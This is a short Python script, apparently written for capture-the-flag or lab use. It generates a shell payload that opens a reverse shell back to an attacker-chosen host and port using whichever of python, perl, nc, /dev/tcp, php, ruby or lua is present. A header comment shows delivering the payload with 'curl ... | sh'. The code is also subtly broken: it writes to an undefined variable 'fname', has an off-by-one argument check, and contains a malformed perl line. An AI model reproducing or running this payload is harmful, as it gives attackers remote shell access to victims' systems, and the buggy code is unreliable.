
# usage: python3 resh.py 10.10.14.19 x
# curl http://10.10.14.19/x | sh


#!/usr/bin/env python3
import os
import sys

if len(sys.argv) < 3:
	print("usage: python3 resh.py <lhost> <lport> <filename>")
	sys.exit(0)

lhost = sys.argv[1]
lport = sys.argv[2]
filename = sys.argv[3]

resh = f'''
if command -v python > /dev/null 2>&1; then
	python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl >  /dev/null 2>&1; then
	perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm -f /tmp/a; mkfifo /tmp/a; nc {lhost} {lport} 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1
	exit;
fi

if command -v php > /dev/null 2>&1; then
	php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'
	exit;
fi

if command -v ruby > /dev/null 2>&1; then
	ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	exit;
fi

if command -v lua > /dev/null 2>&1; then
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"
	exit;
fi
'''

with open(fname,"w") as f:
	f.write(resh)